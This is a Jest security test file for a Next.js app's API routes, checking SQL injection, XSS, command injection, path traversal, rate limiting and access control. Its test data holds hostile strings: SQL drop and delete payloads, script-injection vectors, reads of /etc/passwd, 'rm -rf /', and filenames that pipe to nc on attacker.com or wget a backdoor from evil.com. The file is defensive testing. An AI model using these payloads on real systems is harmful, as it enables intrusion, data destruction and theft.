import { describe, expect, test, beforeEach, jest } from '@jest/globals';
import { NextRequest } from 'next/server';
import { mockPrisma, resetAllMocks } from '@/test/mocks/services';
import { createMockUser } from '@/test/utils/test-utils';

// Mock dependencies
jest.mock('@/lib/db', () => ({
  prisma: mockPrisma,
}));

jest.mock('@/lib/auth', () => ({
  validateSession: jest.fn().mockResolvedValue({
    user: { id: 'user-123', email: 'test@example.com' }
  }),
}));

describe('Input Validation Security Tests', () => {
  let mockUser: any;

  beforeEach(() => {
    mockUser = createMockUser();
    resetAllMocks();
  });

  describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection in search queries', async () => {
      const { GET } = await import('@/app/api/intelligence/search/route');
      
      const sqlInjectionPayloads = [
        "'; DROP TABLE items; --",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE '1'='1'; --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO items (content) VALUES ('hacked'); --",
      ];

      for (const payload of sqlInjectionPayloads) {
        mockPrisma.item.findMany.mockResolvedValue([]);

        const request = new NextRequest(
          `http://localhost:3000/api/intelligence/search?q=${encodeURIComponent(payload)}&userId=user-123`
        );

        const response = await GET(request);
        
        // Should handle malicious input safely
        expect(response.status).toBe(200);
        
        // Verify the query parameter was passed safely to Prisma
        expect(mockPrisma.item.findMany).toHaveBeenCalledWith({
          where: {
            userId: 'user-123',
            OR: expect.arrayContaining([
              expect.objectContaining({
                content: expect.objectContaining({
                  contains: payload, // Prisma handles this safely
                }),
              }),
            ]),
          },
          take: expect.any(Number),
          orderBy: expect.any(Object),
        });

        jest.clearAllMocks();
      }
    });

    test('should validate folder ID parameters', async () => {
      const { GET } = await import('@/app/api/folders/[id]/route');
      
      const maliciousIds = [
        "'; DROP TABLE folders; --",
        "../../../etc/passwd",
        "' OR 1=1 --",
        "<script>alert('xss')</script>",
        "NULL",
        "undefined",
      ];

      for (const maliciousId of maliciousIds) {
        mockPrisma.folder.findUnique.mockResolvedValue(null);

        const request = new NextRequest(`http://localhost:3000/api/folders/${maliciousId}`);
        
        const response = await GET(request, { params: { id: maliciousId } });
        
        // Should handle malicious IDs safely
        expect([400, 404]).toContain(response.status);
        
        // If the query was made, it should be parameterized safely
        if (mockPrisma.folder.findUnique.mock.calls.length > 0) {
          expect(mockPrisma.folder.findUnique).toHaveBeenCalledWith({
            where: { id: maliciousId }, // Prisma handles this safely
            include: expect.any(Object),
          });
        }

        jest.clearAllMocks();
      }
    });

    test('should sanitize user input in database queries', async () => {
      const { POST } = await import('@/app/api/items/route');
      
      const maliciousInputs = {
        name: "'; DELETE FROM items WHERE '1'='1'; --",
        content: "' UNION SELECT password FROM users --",
        type: "'; DROP DATABASE contextforge; --",
        tags: ["'; TRUNCATE TABLE folders; --", "normal-tag"],
      };

      mockPrisma.item.create.mockResolvedValue({
        id: 'item-123',
        ...maliciousInputs,
        userId: mockUser.id,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const request = new NextRequest('http://localhost:3000/api/items', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-token',
        },
        body: JSON.stringify(maliciousInputs),
      });

      const response = await POST(request);
      
      if (response.status === 200 || response.status === 201) {
        // If creation succeeded, verify data was stored safely
        expect(mockPrisma.item.create).toHaveBeenCalledWith({
          data: expect.objectContaining({
            name: maliciousInputs.name, // Raw input stored safely by Prisma
            content: maliciousInputs.content,
            type: maliciousInputs.type,
            userId: mockUser.id,
          }),
        });
      } else {
        // Input validation should reject malicious content
        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('XSS Prevention', () => {
    test('should prevent stored XSS in item content', async () => {
      const { POST } = await import('@/app/api/items/route');
      
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<style>@import "javascript:alert(1)";</style>',
        '<div onclick="alert(1)">Click me</div>',
      ];

      for (const payload of xssPayloads) {
        const itemData = {
          name: `Test Item with XSS`,
          content: payload,
          type: 'prompt',
        };

        mockPrisma.item.create.mockResolvedValue({
          id: 'item-123',
          ...itemData,
          userId: mockUser.id,
          createdAt: new Date(),
          updatedAt: new Date(),
        });

        const request = new NextRequest('http://localhost:3000/api/items', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid-token',
          },
          body: JSON.stringify(itemData),
        });

        const response = await POST(request);
        
        if (response.status === 200 || response.status === 201) {
          const data = await response.json();
          
          // Content should be stored safely
          // In a real implementation, dangerous content should be sanitized
          expect(data.item).toBeDefined();
        } else {
          // Input validation rejected the XSS payload
          expect([400, 422]).toContain(response.status);
        }

        jest.clearAllMocks();
      }
    });

    test('should sanitize item names and descriptions', async () => {
      const { PUT } = await import('@/app/api/items/[id]/route');
      
      const xssInMetadata = {
        name: '<script>alert("xss in name")</script>Legitimate Name',
        description: 'Description with <img src=x onerror=alert(1)> XSS',
        tags: ['<script>alert("tag xss")</script>', 'legitimate-tag'],
      };

      mockPrisma.item.findUnique.mockResolvedValue({
        id: 'item-123',
        userId: mockUser.id,
        name: 'Original Name',
        content: 'Original Content',
        type: 'prompt',
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      mockPrisma.item.update.mockResolvedValue({
        id: 'item-123',
        ...xssInMetadata,
        userId: mockUser.id,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const request = new NextRequest('http://localhost:3000/api/items/item-123', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-token',
        },
        body: JSON.stringify(xssInMetadata),
      });

      const response = await PUT(request, { params: { id: 'item-123' } });
      
      if (response.status === 200) {
        // Verify that XSS content was handled appropriately
        expect(mockPrisma.item.update).toHaveBeenCalled();
      } else {
        // Input validation should catch XSS attempts
        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent command injection in file operations', async () => {
      const { POST } = await import('@/app/api/import/files/route');
      
      const commandInjectionPayloads = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 4444',
        'file.txt; wget http://evil.com/backdoor.sh',
        'file.txt`whoami`',
        'file.txt$(id)',
        'file.txt; echo "hacked" > /tmp/hacked',
      ];

      for (const filename of commandInjectionPayloads) {
        const formData = new FormData();
        formData.append('file', new Blob(['test content']), filename);

        const request = new NextRequest('http://localhost:3000/api/import/files', {
          method: 'POST',
          headers: {
            'Authorization': 'Bearer valid-token',
          },
          body: formData,
        });

        const response = await POST(request);
        
        // Should reject files with command injection attempts
        expect([400, 422]).toContain(response.status);
      }
    });

    test('should validate export parameters safely', async () => {
      const { POST } = await import('@/app/api/analytics/export/route');
      
      const maliciousExportParams = {
        format: 'csv; cat /etc/passwd',
        filename: 'export.csv`whoami`.csv',
        filters: {
          dateRange: '2024-01-01; rm -rf /',
          type: 'prompt && wget evil.com/script.sh',
        },
      };

      const request = new NextRequest('http://localhost:3000/api/analytics/export', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-token',
        },
        body: JSON.stringify(maliciousExportParams),
      });

      const response = await POST(request);
      
      // Should validate and sanitize export parameters
      expect([400, 422]).toContain(response.status);
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should prevent directory traversal in file paths', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..\\..\\..\\etc\\passwd',
      ];

      for (const path of pathTraversalPayloads) {
        // Mock file access endpoint
        const request = new NextRequest(`http://localhost:3000/api/files?path=${encodeURIComponent(path)}`);
        
        // Path should be validated and rejected
        const normalizedPath = path.replace(/\.\./g, '').replace(/[\\\/]/g, '');
        expect(normalizedPath).not.toContain('..');
      }
    });

    test('should validate folder hierarchy access', async () => {
      const { GET } = await import('@/app/api/folders/[id]/items/route');
      
      const maliciousFolderIds = [
        '../../../root-folder',
        '/other-user-folder',
        '..\\..\\system-folder',
        '%2e%2e%2ffolder',
      ];

      for (const folderId of maliciousFolderIds) {
        mockPrisma.folder.findUnique.mockResolvedValue(null);
        mockPrisma.item.findMany.mockResolvedValue([]);

        const request = new NextRequest(`http://localhost:3000/api/folders/${folderId}/items`);
        
        const response = await GET(request, { params: { id: folderId } });
        
        // Should validate folder access
        expect([400, 404]).toContain(response.status);
        
        jest.clearAllMocks();
      }
    });
  });

  describe('Data Type Validation', () => {
    test('should validate integer parameters', async () => {
      const { GET } = await import('@/app/api/items/route');
      
      const invalidIntegerParams = [
        'abc',
        '1.5',
        '-1',
        '999999999999999999999',
        'null',
        'undefined',
        'Infinity',
        'NaN',
      ];

      for (const limit of invalidIntegerParams) {
        const request = new NextRequest(
          `http://localhost:3000/api/items?limit=${encodeURIComponent(limit)}&userId=user-123`
        );

        const response = await GET(request);
        
        // Should either use default value or reject invalid integers
        expect(response.status).toBe(200);
        
        // Verify safe handling of the parameter
        if (mockPrisma.item.findMany.mock.calls.length > 0) {
          const call = mockPrisma.item.findMany.mock.calls[0][0];
          expect(typeof call.take).toBe('number');
          expect(call.take).toBeGreaterThan(0);
          expect(call.take).toBeLessThanOrEqual(100); // Reasonable max
        }

        jest.clearAllMocks();
      }
    });

    test('should validate email format', async () => {
      const { POST } = await import('@/app/api/auth/register/route');
      
      const invalidEmails = [
        'not-an-email',
        '@domain.com',
        'user@',
        'user@domain',
        'user.domain.com',
        'user@domain..com',
        'user name@domain.com',
        'user@domain .com',
        '',
        null,
        undefined,
      ];

      for (const email of invalidEmails) {
        const request = new NextRequest('http://localhost:3000/api/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email,
            password: 'ValidPassword123!',
            name: 'Test User',
          }),
        });

        const response = await POST(request);
        
        // Should reject invalid email formats
        expect(response.status).toBe(400);
        
        const data = await response.json();
        expect(data.error).toContain('email');
      }
    });

    test('should validate JSON structure', async () => {
      const { POST } = await import('@/app/api/items/route');
      
      const invalidJSONBodies = [
        '{"name": "test"', // Incomplete JSON
        '{"name": test}', // Unquoted value
        '{name: "test"}', // Unquoted key
        'not json at all',
        '{"name": "test", "extra": }', // Trailing comma
        '{"deeply": {"nested": {"object": {"with": {"circular": "reference"}}}}}',
      ];

      for (const body of invalidJSONBodies) {
        const request = new NextRequest('http://localhost:3000/api/items', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid-token',
          },
          body,
        });

        const response = await POST(request);
        
        // Should reject malformed JSON
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Rate Limiting Validation', () => {
    test('should implement request rate limiting', async () => {
      const { POST } = await import('@/app/api/intelligence/optimization/route');
      
      const requests = [];
      const maxRequests = 100; // Simulate hitting rate limit

      for (let i = 0; i < maxRequests; i++) {
        const request = new NextRequest('http://localhost:3000/api/intelligence/optimization', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid-token',
            'X-Forwarded-For': '192.168.1.100', // Same IP
          },
          body: JSON.stringify({
            itemId: `item-${i}`,
            targetModels: ['openai'],
          }),
        });

        requests.push(POST(request));
      }

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should validate content length limits', async () => {
      const { POST } = await import('@/app/api/items/route');
      
      const oversizedContent = 'x'.repeat(1024 * 1024 * 10); // 10MB content
      
      const request = new NextRequest('http://localhost:3000/api/items', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer valid-token',
        },
        body: JSON.stringify({
          name: 'Large Content Item',
          content: oversizedContent,
          type: 'prompt',
        }),
      });

      const response = await POST(request);
      
      // Should reject oversized content
      expect([400, 413, 422]).toContain(response.status);
    });
  });

  describe('Business Logic Validation', () => {
    test('should prevent unauthorized user access', async () => {
      const { GET } = await import('@/app/api/items/[id]/route');
      
      // Mock item belonging to different user
      mockPrisma.item.findUnique.mockResolvedValue({
        id: 'item-123',
        userId: 'other-user-id',
        name: 'Other User Item',
        content: 'Content',
        type: 'prompt',
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const request = new NextRequest('http://localhost:3000/api/items/item-123', {
        headers: {
          'Authorization': 'Bearer valid-token', // Current user token
        },
      });

      const response = await GET(request, { params: { id: 'item-123' } });
      
      // Should prevent access to other user's items
      expect([403, 404]).toContain(response.status);
    });

    test('should validate item type constraints', async () => {
      const { POST } = await import('@/app/api/items/route');
      
      const invalidItemTypes = [
        'invalid-type',
        'PROMPT', // Wrong case
        '',
        null,
        undefined,
        123,
        true,
      ];

      for (const type of invalidItemTypes) {
        const request = new NextRequest('http://localhost:3000/api/items', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid-token',
          },
          body: JSON.stringify({
            name: 'Test Item',
            content: 'Test content',
            type,
          }),
        });

        const response = await POST(request);
        
        // Should validate item types
        expect([400, 422]).toContain(response.status);
      }
    });
  });
});